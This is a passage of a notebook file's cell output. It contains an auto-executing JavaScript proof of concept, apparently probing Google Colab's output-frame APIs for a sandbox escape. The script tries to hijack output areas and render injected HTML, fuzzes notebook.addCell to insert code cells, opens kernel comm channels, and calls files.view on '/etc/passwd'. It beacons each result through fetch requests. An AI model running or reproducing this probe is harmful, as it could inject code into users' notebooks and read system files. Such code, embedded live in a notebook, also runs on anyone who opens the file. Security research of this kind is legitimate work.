      ],
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "application/javascript": "\n(async function poc8() {\n  const B = 'https://colab.research.google.com/__poc8';\n  const log = async (tag, val) => {\n    try {\n      await fetch(B + '/' + tag + '?v=' + encodeURIComponent(String(val).slice(0, 500)));\n    } catch(e) {}\n  };\n\n  await log('start', location.host + '|' + Date.now());\n\n  // \u2500\u2500 OUTPUT AREA PROBES \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n  // Get actual output area elements first - needed for renderOutput fix\n  let defaultArea = null, activeArea = null;\n  try {\n    defaultArea = window.google.colab.output.getDefaultOutputArea();\n    await log('OUT_default_type', defaultArea ? defaultArea.tagName + '|id=' + defaultArea.id : 'null');\n  } catch(e) { await log('OUT_default_err', e.message); }\n\n  try {\n    activeArea = window.google.colab.output.getActiveOutputArea();\n    await log('OUT_active_type', activeArea ? activeArea.tagName + '|id=' + activeArea.id : 'null');\n  } catch(e) { await log('OUT_active_err', e.message); }\n\n  // setActiveOutputArea \u2014 can we redirect output to our container?\n  try {\n    const div = document.createElement('div');\n    div.id = 'poc8_container';\n    document.body.appendChild(div);\n    window.google.colab.output.setActiveOutputArea(div);\n    await log('OUT_setActive', 'no_throw');\n    // Restore\n    if (activeArea) window.google.colab.output.setActiveOutputArea(activeArea);\n  } catch(e) { await log('OUT_setActive_err', e.name + '|' + e.message); }\n\n  // renderOutput with real area\n  try {\n    const area = defaultArea || activeArea;\n    if (area) {\n      const r = await window.google.colab.output.renderOutput(\n        {data: {'text/html': '<b>poc8_inject</b>', 'text/plain': 'poc8_inject'}, metadata: {}},\n        area\n      );\n      await log('RENDER_real_result', JSON.stringify(r) || 'no_return');\n    } else {\n      await log('RENDER_real_skip', 'no_area_available');\n    }\n  } catch(e) { await log('RENDER_real_err', e.name + '|' + e.message); }\n\n  // pauseOutputUntil \u2014 what does it do/return?\n  try {\n    const p = window.google.colab.output.pauseOutputUntil;\n    await log('PAUSE_length', p.length);\n    // Pass a resolved promise \u2014 should be a no-op if it just blocks rendering\n    const sentinel = Promise.resolve('poc8_sentinel');\n    const r = window.google.colab.output.pauseOutputUntil(sentinel);\n    await log('PAUSE_call_result', r === undefined ? 'undefined' : JSON.stringify(r));\n  } catch(e) { await log('PAUSE_err', e.name + '|' + e.message); }\n\n  // \u2500\u2500 ADDCELL SIGNATURE HUNT \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n  // The crash is \"Cannot read properties of undefined (reading 'slice')\"\n  // Something in arg2 (or a nested field) is undefined when we try .slice on it\n  // Systematic variants:\n\n  const addCellVariants = [\n    ['v1_after_empty',   () => window.google.colab.notebook.addCell('code', {after: '', source: 'print(\"poc8_v1\")'})],\n    ['v2_after_null',    () => window.google.colab.notebook.addCell('code', {after: null, source: 'print(\"poc8_v2\")'})],\n    ['v3_source_only',   () => window.google.colab.notebook.addCell('code', {source: 'print(\"poc8_v3\")'})],\n    ['v4_empty_obj',     () => window.google.colab.notebook.addCell('code', {})],\n    ['v5_type_obj',      () => window.google.colab.notebook.addCell({type: 'code', source: 'print(\"poc8_v5\")', after: ''})],\n    ['v6_text_type',     () => window.google.colab.notebook.addCell('text', {after: '', source: '## poc8_v6'})],\n    ['v7_one_arg',       () => window.google.colab.notebook.addCell('code')],\n    ['v8_swapped',       () => window.google.colab.notebook.addCell({source: 'print(\"poc8_v8\")'}, 'code')],\n    ['v9_index_zero',    () => window.google.colab.notebook.addCell('code', {after: '', index: 0, source: 'print(\"poc8_v9\")'})],\n    ['v10_no_args',      () => window.google.colab.notebook.addCell()],\n  ];\n\n  for (const [name, fn] of addCellVariants) {\n    try {\n      const r = await fn();\n      await log('ADDCELL_' + name, 'SUCCESS|' + JSON.stringify(r).slice(0, 200));\n    } catch(e) {\n      await log('ADDCELL_' + name + '_err', e.name + '|' + e.message.slice(0, 150));\n    }\n  }\n\n  // \u2500\u2500 COMMS RECEIVE PATH \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n  // registerTarget succeeded in poc7. Now: register a target and try to open\n  // a channel TO that same target from our own frame (intra-frame loopback)\n  try {\n    let received = null;\n    window.google.colab.kernel.comms.registerTarget('poc8_loop', (comm, openMsg) => {\n      received = openMsg;\n    });\n    await log('COMMS_loop_registered', 'ok');\n\n    // Try opening to our own target\n    try {\n      const c = await window.google.colab.kernel.comms.open('poc8_loop', {test: 'poc8'}, {});\n      await log('COMMS_loop_open', JSON.stringify(c).slice(0, 200));\n    } catch(e) { await log('COMMS_loop_open_err', e.name + '|' + e.message); }\n  } catch(e) { await log('COMMS_loop_err', e.name + '|' + e.message); }\n\n  // \u2500\u2500 FILES.VIEW \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  try {\n    const fv = window.google.colab.files.view;\n    await log('FILES_view_type', typeof fv);\n    await log('FILES_view_length', fv.length);\n    await log('FILES_view_src', fv.toString().slice(0, 200));\n    // Try calling with a path\n    try {\n      const r = await window.google.colab.files.view('/etc/passwd');\n      await log('FILES_view_call', JSON.stringify(r).slice(0, 200));\n    } catch(e) { await log('FILES_view_call_err', e.name + '|' + e.message); }\n  } catch(e) { await log('FILES_view_threw', e.message); }\n\n  await log('done', Date.now());\n})();\n",
            "text/plain": [
              "<poc8_autoexec>"
            ]
          },
          "metadata": {}
        }
      ],
      "execution_count": 1
    }
